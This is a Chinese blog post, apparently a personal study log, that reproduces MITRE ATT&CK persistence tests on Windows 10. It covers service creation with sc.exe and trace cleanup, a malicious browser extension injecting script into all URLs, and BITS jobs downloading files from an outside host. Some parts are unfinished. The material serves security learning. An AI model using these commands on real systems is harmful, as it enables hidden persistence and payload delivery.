---
layout: post
title: 跟着ATT&CK学安全之persistence
excerpt: "跟着ATT&CK学安全之persistence"
categories: [ATT&CK]
comments: true
---
### T1050 - New Service

###### 测试1,创建一个新的服务
```
sc.exe create #{service_name} binPath= #{binary_path}
sc.exe start #{service_name}
```
就是
```

```
清除痕迹
```
sc.exe stop #{service_name}
sc.exe delete #{service_name}
```
#### T1100 - Web Shell
通过使用webshell来维持控制,demo略

成功复现
#### Valid Accounts
通过已有的账号来维持控制

这个没法复现
### T1176 - Browser Extensions
有些恶意软件是通过浏览器扩展的形式贮存在客户端上,而这些恶意

###### 测试1 Chrome (Developer Mode)
1. 打开chrome://extensions 并选择开发者模式
2. 加载已解压的扩展程序

win10成功复现
##### 测试2 Chrome (Chrome Web Store)
1. 在chrome中打开`https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend`
2. 点击'Add to Chrome'

win10成功复现
##### 测试3 FireFox
1. Navigate to about:debugging and click "Load Temporary Add-on"
2. Navigate to manifest.json
3. Then click 'Open'

其中manifest.json
```
{
  "name": "Minimum Viable Malicious Extension",
  "description": "Base Level Extension",
  "version": "1.0",
  "manifest_version": 2,
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": [
        "inline.js"
      ]
    }
  ]
}
```
win10成功复现
### T1197 - BITS Jobs
windows后台智能传输服务(BITS)是一个通过Component Object Model (COM)的低带宽,同步文件传输的服务.BITS是一个用来更新,传输信息和其他应用后台操作并且不会干扰其他应用网络.我们可以通过powershell和BITSAdmin来创建BITS jobs

红队可以使用BITS来下载,运行恶意代码,甚至清除这些恶意代码.BITS运行不需要新建文件或者修改注册表,而且没有防火墙的拦截
###### 测试1 Download & Execute
```
bitsadmin.exe /transfer /Download /priority Foreground http://snappyzz.com/calc.calc D:\bitsadmin_flag.ps1
```
win10 下载成功复现,运行没有成功复现
###### 测试2 Download & Execute via PowerShell BITS
```
Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
```
win10 下载成功复现,运行没有成功复现
###### 测试3 Persist, Download, & Execute
这个今晚弄